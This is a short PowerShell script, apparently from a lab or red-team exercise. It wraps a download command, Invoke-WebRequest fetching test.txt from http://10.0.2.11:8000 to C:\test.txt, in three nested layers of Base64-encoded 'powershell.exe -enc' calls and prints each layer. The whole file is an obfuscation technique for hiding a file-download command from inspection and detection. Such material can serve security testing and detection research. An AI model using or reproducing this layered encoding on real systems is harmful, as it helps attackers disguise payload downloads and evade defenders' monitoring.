echo 1
$command1_1 = "powershell Invoke-WebRequest http://10.0.2.11:8000/test.txt -OutFile C:\test.txt;"
$command1_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command1_1))
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command1_1))

echo 2
$command2_1 = "powershell.exe -enc "  + $command1_2
$command2_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command2_1))
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command2_1))


echo 3
$command3_1 = "powershell.exe -enc "  + $command2_2
$command3_2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command3_1))
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command3_1))